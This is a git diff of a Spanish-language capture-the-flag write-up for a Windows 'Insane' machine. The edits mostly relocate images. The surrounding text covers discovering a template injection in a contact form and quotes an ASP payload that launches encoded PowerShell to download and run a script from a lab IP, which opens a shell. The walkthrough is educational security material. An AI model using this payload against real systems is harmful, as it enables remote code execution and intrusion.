@@ -4,8 +4,10 @@ date: '2022-02-12'
 tags: ["CTF", "Windows", "SSTI", "#Import 2022-12-20 21:06"]
 draft: true
 authors: ['default']
-summary: Esta máquina es diferente al resto Su nivel es Insane y creo que es perfecta para aprender cada det
+summary: '![](/static/images/uploads/ctf-anubis-writeup/anubis.webp)'
 ---
+
+![](/static/images/uploads/ctf-anubis-writeup/anubis.webp)
 
 Esta máquina es diferente al resto. Su nivel es Insane y creo que es perfecta para aprender cada detalle de como progresamos en ella. Tiene además Windows instalado y toca aspectos de contenedores. Vamos a ello.
 
@@ -100,7 +102,9 @@ HTTP/2 200
 ```
 ..Si tratamos de acceder al servidor directamente con la IP nos arroja un estado HTTP 404 mientras que con el dominio somos capaces de llegar a la página.
 
-![](https://blog.ikerocio.com/content/images/2022/02/image-8.png)Examinamos con *openssl* el certificado de manera más detallada por si arrojase más información relevante.
+![](/static/images/uploads/ctf-anubis-writeup/image-8.webp)
+
+Examinamos con *openssl* el certificado de manera más detallada por si arrojase más información relevante.
 
 
 ```
@@ -128,15 +132,23 @@ Vemos que está un [Internet Information Services](https://es.wikipedia.org/wiki
 
 Nos encontramos ante un formulario.
 
-![](https://blog.ikerocio.com/content/images/2022/02/image-9.png)Si introducimos información en él y le damos a *Send Message*, nos encontramos la siguiente página.
+![](/static/images/uploads/ctf-anubis-writeup/image-9.webp)
 
-![](https://blog.ikerocio.com/content/images/2022/02/image-10.png)La información que hemos escrito en la página anterior es exactamente la que visualizamos una vez pulsamos el primer botón. Hay muchas probabilidades de que nos estemos encontrando ante un [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection).
+Si introducimos información en él y le damos a *Send Message*, nos encontramos la siguiente página.
+
+![](/static/images/uploads/ctf-anubis-writeup/image-10.webp)
+
+La información que hemos escrito en la página anterior es exactamente la que visualizamos una vez pulsamos el primer botón. Hay muchas probabilidades de que nos estemos encontrando ante un [Server Side Template Injection](https://portswigger.net/web-security/server-side-template-injection).
 
 Vamos a comprobarlo volviendo a la página anterior, introduciendo unos nuevos valores y volviendo a pulsar el botón.
 
-![](https://blog.ikerocio.com/content/images/2022/02/image-13.png)¿5x5? 😎 Exacto, 25.
+![](/static/images/uploads/ctf-anubis-writeup/image-13.webp)
 
-![](https://blog.ikerocio.com/content/images/2022/02/image-14.png)Lo que ha sucedido es que hemos conseguido inyectar código y el servidor ha interpretado el resultado. En este caso, el código del servidor no limpia el input del usuario y permite ejecutar directamente en su plantilla lo introducido anteriormente. Esto no es algo único de ASP. Este tipo de vulnerabilidades se pueden dar (y se dan) en cualquier lenguaje que tenga un motor de renderizado de plantillas como puede ser Jinja2 u otros.
+¿5x5? 😎 Exacto, 25.
+
+![](/static/images/uploads/ctf-anubis-writeup/image-14.webp)
+
+Lo que ha sucedido es que hemos conseguido inyectar código y el servidor ha interpretado el resultado. En este caso, el código del servidor no limpia el input del usuario y permite ejecutar directamente en su plantilla lo introducido anteriormente. Esto no es algo único de ASP. Este tipo de vulnerabilidades se pueden dar (y se dan) en cualquier lenguaje que tenga un motor de renderizado de plantillas como puede ser Jinja2 u otros.
 
 Encontramos un modo de ejecutar código desde una shell [aquí](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html).
 
@@ -185,7 +197,9 @@ Ponemos el script inferior en el formulario y ejecutamos.
 ```
 %response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQAvAFAAUwAuAHAAcwAxACcAKQAKAA==").StdOut.Readall()%
 ```
-![](https://blog.ikerocio.com/content/images/2022/02/image-16.png)Ya hemos ganado acceso a la máquina.
+![](/static/images/uploads/ctf-anubis-writeup/image-16.webp)
+
+Ya hemos ganado acceso a la máquina.
 
 Con un par de comandos como ipconfig y ls C: nos damos cuenta de que estamos en un contenedor.
 
